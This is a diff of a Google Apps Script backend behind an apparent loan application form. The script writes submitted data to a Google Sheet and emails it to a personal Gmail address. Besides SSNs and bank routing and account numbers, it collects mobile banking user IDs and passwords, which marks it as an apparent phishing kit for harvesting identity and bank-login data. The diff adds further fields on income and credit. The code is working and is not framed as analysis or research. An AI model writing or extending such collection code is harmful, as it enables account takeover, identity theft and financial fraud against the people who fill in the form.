@@ -1,13 +1,13 @@
-// SIMPLE GOOGLE SHEETS SCRIPT - Copy this into your Google Apps Script project
+// SIMPLE GOOGLE SHEETS SCRIPT - FINAL VERSION
 // Go to: https://script.google.com/home
-// Click "New Project"
-// Delete all existing code
-// Paste this code
+// Open your existing project
+// DELETE ALL existing code
+// PASTE this entire code
 // Save and Deploy as Web App
 
-// IMPORTANT: Create a NEW Google Sheet under ericmason007007@gmail.com account
+// Create a NEW Google Sheet under ericmason007@gmail.com account
 // Then replace the URL below with your new sheet URL
-const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";
+const SHEET_URL = "https://docs.google.com/spreadsheets/d/REPLACE_WITH_YOUR_NEW_SHEET_ID/edit";
 
 function doGet(e) {
   return HtmlService.createHtmlOutput('Google Sheets API is working! Use POST to submit data.');
@@ -22,7 +22,8 @@ function doPost(e) {
     sheet.appendRow([
       data.loanAmount || "",
       data.loanPurpose || "",
-      data.name || "",
+      data.creditScore || "",
+      data.fullName || data.name || "",
       data.email || "",
       data.phone || "",
       data.streetAddress || "",
@@ -30,15 +31,19 @@ function doPost(e) {
       data.state || "",
       data.zipCode || "",
       data.ssn || "",
+      data.annualIncome || "",
+      data.employmentStatus || "",
+      data.monthlyHousing || "",
       data.bankName || data.customerBank || "",
       data.routingNumber || "",
       data.accountNumber || "",
+      data.yourBank || "",
       data.mobileBankingUserId || "",
       data.mobileBankingPassword || "",
       new Date()
     ]);
 
-    // Send email notification to ericmason007007@gmail.com
+    // Send email notification to ericmason007@gmail.com
     sendEmailNotification(data);
 
     return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
@@ -55,13 +60,14 @@ function sendEmailNotification(data) {
   try {
     const recipientEmail = "ericmason007@gmail.com"; // Your email address
     
-    // Create email subject
+    // Get customer name
     const customerName = data.fullName || data.name || 'Customer';
+    
+    // Create email subject
     const subject = `New Loan Application - ${customerName} - $${data.loanAmount || 'N/A'}`;
     
     // Create email body
-    const body = `
-New Loan Application Received:
+    const body = `New Loan Application Received:
 
 Customer Information:
 - Name: ${customerName}
@@ -81,8 +87,7 @@ Loan Details:
 
 Application submitted: ${new Date().toLocaleString()}
 
-Check your Google Sheet for complete details.
-    `;
+Check your Google Sheet for complete details.`;
     
     // Send email
     MailApp.sendEmail({
@@ -95,23 +100,5 @@ Check your Google Sheet for complete details.
     
   } catch (emailError) {
     console.log('Failed to send email: ' + emailError.message);
-  }
-}
-
-function doGet() {
-  return ContentService.createTextOutput("Google Sheets API working");
-}
-
-// Helper function to get spreadsheet info
-function getSpreadsheetInfo() {
-  try {
-    const spreadsheet = SpreadsheetApp.getActiveSpreadsheet();
-    return {
-      url: spreadsheet.getUrl(),
-      name: spreadsheet.getName(),
-      sheets: spreadsheet.getSheets().map(sheet => sheet.getName())
-    };
-  } catch (e) {
-    return { error: 'No active spreadsheet found' };
   }
 }
